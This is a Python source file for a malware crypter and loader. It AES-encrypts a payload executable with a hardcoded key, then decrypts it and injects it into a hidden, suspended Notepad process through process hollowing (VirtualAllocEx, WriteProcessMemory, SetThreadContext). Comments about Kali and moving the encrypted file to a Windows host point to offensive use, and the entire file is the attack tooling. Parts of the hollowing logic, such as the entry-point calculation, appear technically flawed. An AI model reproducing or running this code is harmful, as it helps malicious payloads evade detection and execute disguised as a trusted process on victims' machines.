import base64
import os
import ctypes
import struct
import time
import logging
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configure Logging
logging.basicConfig(
    level=logging.DEBUG, 
    format="%(asctime)s [%(levelname)s] %(message)s", 
    datefmt="%H:%M:%S"
)

# File Paths (resolve relative to script or bundled EXE)
if getattr(sys, 'frozen', False):
    # Running as a PyInstaller bundle
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
executor_path = os.path.join(BASE_DIR, "payloads", "Executor.exe")  # Payload PATH
encrypted_path = os.path.join(BASE_DIR, "enc", "Executor.enc")      # Enc PATH

# AES Key (16 bytes)
key = b'Sixteen byte key'
cipher = AES.new(key, AES.MODE_ECB)

def encrypt_executor():
    """ Encrypt Executor.exe into Executor.enc """
    logging.info("[ENCRYPTION] Starting encryption process...")
    
    if not os.path.exists(executor_path):
        logging.error(f"[ENCRYPTION] File not found: {executor_path}")
        return False

    try:
        with open(executor_path, "rb") as f:
            data = f.read()
        logging.debug(f"[ENCRYPTION] Read {len(data)} bytes from {executor_path}")

        start_time = time.time()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        logging.debug(f"[ENCRYPTION] Encryption completed in {time.time() - start_time:.4f} seconds")

        # Ensure destination directory exists
        os.makedirs(os.path.dirname(encrypted_path), exist_ok=True)

        with open(encrypted_path, "wb") as f:
            f.write(base64.b64encode(encrypted_data))
        logging.info(f"[ENCRYPTION] Encrypted file saved at: {encrypted_path}")

        return True

    except Exception as e:
        logging.error(f"[ENCRYPTION] Encryption failed: {e}")
        return False

def decrypt_and_hollow():
    """ Decrypt Executor.enc and perform process hollowing into Notepad """
    logging.info("[DECRYPTION] Starting decryption & process hollowing...")

    # Ensure we're running on Windows before importing Windows-specific modules
    if os.name != 'nt':
        logging.error("[PLATFORM] Process hollowing requires Windows. Detected: %s", os.name)
        return False

    try:
        import win32api
        import win32process
        import win32con
        import psutil
    except Exception as e:
        logging.error("[DEPENDENCY] Missing Windows dependencies (pywin32/psutil): %s", e)
        logging.error("[DEPENDENCY] On Windows, install via: pip install pywin32 psutil pycryptodome")
        return False

    if not os.path.exists(encrypted_path):
        logging.error(f"[DECRYPTION] File not found: {encrypted_path}")
        return False

    try:
        with open(encrypted_path, "rb") as f:
            encrypted_data = base64.b64decode(f.read())

        start_time = time.time()
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        logging.debug(f"[DECRYPTION] Decryption completed in {time.time() - start_time:.4f} seconds")
        logging.info(f"[DECRYPTION] Decrypted {len(decrypted_data)} bytes successfully.")
    except Exception as e:
        logging.error(f"[DECRYPTION] Error decrypting file: {e}")
        return False

    # --- Start Notepad Suspended ---
    logging.info("[PROCESS] Launching Notepad in suspended mode...")
    startupinfo = win32process.STARTUPINFO()
    startupinfo.dwFlags |= win32process.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # Hidden

    try:
        pi = win32process.CreateProcess(
            "C:\\Windows\\System32\\notepad.exe",
            None, None, None, False, 
            win32con.CREATE_SUSPENDED, 
            None, None, startupinfo
        )
    except Exception as e:
        logging.error(f"[PROCESS] Failed to create Notepad process: {e}")
        return False

    pid = pi[2]
    thread_handle = pi[1]
    logging.info(f"[PROCESS] Notepad started with PID: {pid}")

    time.sleep(2)

    if not any(p.pid == pid for p in psutil.process_iter(['pid', 'name'])):
        logging.error("[PROCESS] Notepad did not start correctly.")
        return False

    # Open the process
    logging.info("[PROCESS] Opening Notepad process...")
    process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        logging.error("[PROCESS] Failed to open Notepad process.")
        return False

    logging.info(f"[PROCESS] Process Handle obtained: {process_handle}")

    # Allocate memory in Notepad for the decrypted EXE at its preferred ImageBase
    preferred_base = 0x00400000
    logging.info(f"[MEMORY] Attempting to allocate memory at {hex(preferred_base)}...")

    allocated_memory = ctypes.windll.kernel32.VirtualAllocEx(
        int(process_handle), preferred_base, len(decrypted_data), 0x1000 | 0x2000, 0x40
    )

    if not allocated_memory:
        logging.warning(f"[MEMORY] Memory allocation at {hex(preferred_base)} failed. Trying automatic allocation...")
        allocated_memory = ctypes.windll.kernel32.VirtualAllocEx(
            int(process_handle), None, len(decrypted_data), 0x1000 | 0x2000, 0x40
        )

    if not allocated_memory:
        logging.error("[MEMORY] Memory allocation completely failed. Exiting...")
        return False

    logging.info(f"[MEMORY] Allocated Memory Address: {hex(allocated_memory)}")

    # Write decrypted EXE into Notepad's memory
    bytes_written = ctypes.c_size_t(0)
    logging.info("[MEMORY] Writing payload to Notepad's memory...")
    if not ctypes.windll.kernel32.WriteProcessMemory(
        int(process_handle), allocated_memory, decrypted_data, len(decrypted_data), ctypes.byref(bytes_written)
    ):
        logging.error("[MEMORY] WriteProcessMemory failed.")
        return False

    logging.info(f"[MEMORY] Bytes written: {bytes_written.value}")

    # Retrieve and modify Notepad's execution context
    logging.info("[THREAD] Retrieving Notepad thread context...")
    context = (ctypes.c_uint * 179)()
    context[0] = 0x10007  # CONTEXT_FULL
    if not ctypes.windll.kernel32.GetThreadContext(int(thread_handle), ctypes.byref(context)):
        logging.error("[THREAD] GetThreadContext failed.")
        return False

    # Calculate new Entry Point
    logging.info("[THREAD] Calculating new entry point...")
    entry_point_rva = struct.unpack("<I", decrypted_data[0x3C + 0x28:0x3C + 0x2C])[0]
    new_entry_point = allocated_memory + entry_point_rva
    logging.info(f"[THREAD] Updated Entry Point: {hex(new_entry_point)}")

    # Modify EAX register to point to new entry
    eax_offset = 0xB8
    context[eax_offset // 4] = new_entry_point

    # Update the thread context
    logging.info("[THREAD] Updating Notepad's thread context...")
    if not ctypes.windll.kernel32.SetThreadContext(int(thread_handle), ctypes.byref(context)):
        logging.error("[THREAD] SetThreadContext failed.")
        return False

    # Resume Notepad execution (now running payload)
    logging.info("[THREAD] Resuming Notepad execution...")
    win32process.ResumeThread(thread_handle)
    ctypes.windll.kernel32.CloseHandle(int(process_handle))
    logging.info("[SUCCESS] Process Hollowing Completed Successfully.")
    return True

if __name__ == "__main__":
    # Encrypt if payload exists (works on Kali/Windows)
    if os.path.exists(executor_path):
        encrypt_executor()
    else:
        logging.info("[ENCRYPTION] Payload not found; skipping encryption. Path: %s", executor_path)

    # Hollow only on Windows if .enc is available
    if os.name == 'nt':
        if os.path.exists(encrypted_path):
            decrypt_and_hollow()
        else:
            logging.error("[DECRYPTION] Encrypted file not found: %s", encrypted_path)
    else:
        logging.info("[INFO] Non-Windows environment detected. Skipping hollowing.")
        logging.info("[INFO] Move the generated .enc file to a Windows host and run there.")
